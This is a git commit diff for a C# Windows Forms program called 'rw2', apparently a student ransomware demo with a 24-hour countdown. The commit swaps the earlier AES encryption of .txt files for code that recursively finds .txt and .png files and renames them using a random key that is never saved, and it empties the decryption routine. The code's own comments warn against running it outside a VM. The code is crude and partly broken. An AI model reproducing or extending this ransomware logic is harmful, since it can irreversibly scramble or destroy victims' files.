432835f1be9c258f36e590c86cc842f719029902
PervyTin <beneckym.05@spst.eu>
2022-12-04 14:51:22 +0100

    crypce dodelana

--- rw2/Form1.cs
+++ rw2/Form1.cs
@@ -16,6 +16,7 @@ using System.Security.AccessControl;
 namespace rw2
 {
     //JESTE JSEM TO NETESTOVAL A NEBUDU TO TESTOVAT DOKUD TO NEBUDU MIT VE VM, FAKT TO NETESTUJ BEZ TOHO!
+    //naser si hovno B) -03.12.2022
     public partial class Form1 : Form
     {
         public int hours = 24, minutes = 0, seconds = 0;
@@ -23,85 +24,75 @@ namespace rw2
         {
             InitializeComponent();
         }
+        string alphabet = "abcdefghijklmnopqrstuvwxyz";
+        string alphabetDecrypted;
+        string password;
+        public string getRandomString(int minLength, int maxLength)
+        {
+            Random rnd = new Random();
+            string str = string.Empty;
+            int length = rnd.Next(minLength, maxLength+1);
+            for(int i = 0; i < length; i++)
+            {
+                str += alphabet[rnd.Next(0, 26)];
+            }
+            return str;
+        }
+        public char getCryptedCharacter(string password, char givenChar)
+        {
+            int vys = 0;
+            if(givenChar == '.')
+            {
+                return givenChar;
+            }
+            foreach(char character in password)
+            {
+                vys += (character * givenChar);
+            }
+            vys %= 25;
+            return alphabet[vys];
+        }
+        public string getCryptedString(string password, string str)
+        {
+            string vys = string.Empty;
+            foreach(char character in str)
+            {
+                vys += getCryptedCharacter(password, character);
+            }
+            return vys;
+        }
         
         public void encrypce()
         {
-            string password = @"prezentaceKYB"; 
-            UnicodeEncoding UE = new UnicodeEncoding();
-            byte[] key = UE.GetBytes(password);
             string filePath = System.Reflection.Assembly.GetEntryAssembly().Location;
             filePath =filePath.Remove(filePath.Length - System.AppDomain.CurrentDomain.FriendlyName.Length);
-            string[] filePaths = Directory.GetFiles(filePath, "*.txt");
-
-           
-            foreach (string file in filePaths)
+            string[] filePathsTXT = Directory.GetFiles(filePath, "*.txt", SearchOption.AllDirectories);
+            string[] filePathsPNG = Directory.GetFiles(filePath, "*.png", SearchOption.AllDirectories);
+            List<string> fileNames = new List<string>();
+            
+            foreach(string file in filePathsTXT)
             {
-                try
-                {
-                    string cryptFile = file;
-                    FileStream fsCrypt = new FileStream(cryptFile, FileMode.Create);
-                    RijndaelManaged RMCrypto = new RijndaelManaged();
-
-                    CryptoStream cs = new CryptoStream(fsCrypt,
-                        RMCrypto.CreateEncryptor(key, key),
-                        CryptoStreamMode.Write);
-
-                    FileStream fsIn = new FileStream(file, FileMode.Open);
-
-                    int data;
-                    while ((data = fsIn.ReadByte()) != -1)
-                        cs.WriteByte((byte)data);
-
-
-                    fsIn.Close();
-                    cs.Close();
-                    fsCrypt.Close();
-                }
-                catch
-                {
-                    MessageBox.Show("Failed");
-                }
+                fileNames.Add(file.Remove(0, filePath.Length));
             }
+            foreach (string file in filePathsPNG)
+            {
+                fileNames.Add(file.Remove(0, filePath.Length));
+            }
+            password = getRandomString(10, 25);
+            foreach (string file in fileNames)
+            {
+                File.Move(file, getCryptedString(password, file));
+            }
+
+
         }
         public void dekrypce()
         {
-            string password = @"prezentaceKYB";
-            UnicodeEncoding UE = new UnicodeEncoding();
-            byte[] key = UE.GetBytes(password);
             string filePath = System.Reflection.Assembly.GetEntryAssembly().Location;
             filePath = filePath.Remove(filePath.Length - System.AppDomain.CurrentDomain.FriendlyName.Length);
+            string fileEnd = string.Empty;
             string[] filePaths = Directory.GetFiles(filePath, "*.txt");
 
-
-            foreach (string file in filePaths)
-            {
-                try
-                {
-                    string cryptFile = file;
-
-                    FileStream fsCrypt = new FileStream(file, FileMode.Open);
-
-                    RijndaelManaged RMCrypto = new RijndaelManaged();
-
-                    CryptoStream cs = new CryptoStream(fsCrypt,
-                        RMCrypto.CreateDecryptor(key, key),
-                        CryptoStreamMode.Read);
-
-                    FileStream fsOut = new FileStream(file, FileMode.Create);
-
-                    int data;
-                    while ((data = cs.ReadByte()) != -1)
-                        fsOut.WriteByte((byte)data);
-
-                    fsOut.Close();
-                    cs.Close();
-                    fsCrypt.Close();
-                }
-                catch
-                {
-                    MessageBox.Show("Failed");
-                }
-            }
         }
 
         private void button1_Click(object sender, EventArgs e)
